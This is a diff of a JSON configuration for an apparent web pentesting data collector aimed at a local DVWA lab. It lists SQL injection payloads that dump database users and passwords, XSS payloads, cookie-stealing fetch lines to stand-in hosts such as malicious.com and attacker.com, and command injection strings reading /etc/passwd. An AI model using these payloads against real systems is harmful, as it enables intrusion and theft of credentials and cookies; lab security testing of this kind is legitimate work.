@@ -11,7 +11,8 @@
             "' or 1=1--",
             "1' AND '1'='1",
             "1' UNION SELECT 1,2,3--",
-            "1'; DROP TABLE users--",
+            "1' UNION SELECT 1,database(),user(),version(),5--",
+            "1' UNION SELECT user,password,1,1,1 FROM users--",
             "1' OR '1'='1' --",
             "admin' --",
             "admin'/*",
@@ -28,7 +29,7 @@
         ],
         "csrf": [
             "<form action=\"http://evil.com\" method=\"POST\">",
-            "<img src=\"http://attacker.com/log?stolen=\"",
+            "<img src=\"http://attacker.com/log?stolen=\">",
             "<script>fetch('http://malicious.com?cookie='+document.cookie)</script>"
         ],
         "cmd_injection": [
@@ -43,59 +44,13 @@
         "type": "dvwa",
         "login_url": "http://localhost/DVWA/login.php",
         "username": "admin",
-        "password": "password", 
+        "password": "password",
         "security_url": "http://localhost/DVWA/security.php"
     },
     "headers": {
-        "User-Agent": "PenteIA-DataCollector/2.0",
+        "User-Agent": "PenteIA-DataCollector/3.0",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3"
-    },
-    "max_workers": 3,
-    "timeout": 10,
-    "output_file": "raw_data.csv",
-    "delay_between_requests": 1.0
-}
-{
-    "urls_alvo": [
-        "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit",
-        "http://localhost/DVWA/vulnerabilities/xss_r/?name=guest",
-        "http://localhost/DVWA/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit"
-    ],
-    "payloads": {
-        "sqli": [
-            "' or 1=1--",
-            "1' AND '1'='1",
-            "1' UNION SELECT 1,database(),user(),version(),5--",
-            "1' UNION SELECT user,password,1,1,1 FROM users--"
-        ],
-        "xss": [
-            "<script>alert(1)</script>",
-            "<img src=x onerror=alert(2)>",
-            "<svg onload=alert(document.cookie)>",
-            "javascript:alert(document.domain)"
-        ],
-        "cmd_injection": [
-            "127.0.0.1; ls -la",
-            "127.0.0.1 && cat /etc/passwd",
-            "127.0.0.1 | id",
-            "$(whoami)"
-        ]
-    },
-    "auth": {
-        "type": "dvwa",
-        "login_url": "http://localhost/DVWA/login.php",
-        "security_url": "http://localhost/DVWA/security.php",
-        "username": "admin",
-        "password": "password"
-    },
-    "headers": {
-        "User-Agent": "PenteIA-DataCollector/1.0",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
-        "DNT": "1",
-        "Connection": "keep-alive",
-        "Upgrade-Insecure-Requests": "1"
     },
     "max_workers": 3,
     "timeout": 10,
